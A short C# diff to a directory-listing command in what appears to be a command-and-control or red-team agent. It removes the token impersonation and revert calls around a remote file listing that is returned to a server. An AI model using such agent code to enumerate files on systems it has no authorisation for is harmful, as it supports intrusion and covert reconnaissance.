@@ -20,10 +20,6 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             string path = String.Empty;
-            if (job.task.token != 0)
-            {
-                tokenManager.Impersonate(job.task.token);
-            }
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
             
             if (!args.ContainsKey("path") || args["path"] == ".")
@@ -64,10 +60,6 @@ namespace Agent
                     }
                     await messageManager.AddResponse(RemoteListing.GetRemoteListing(fullPath, host, job.task.id));
                 }
-            }
-            if (job.task.token != 0)
-            {
-                tokenManager.Revert();
             }
         }
     }
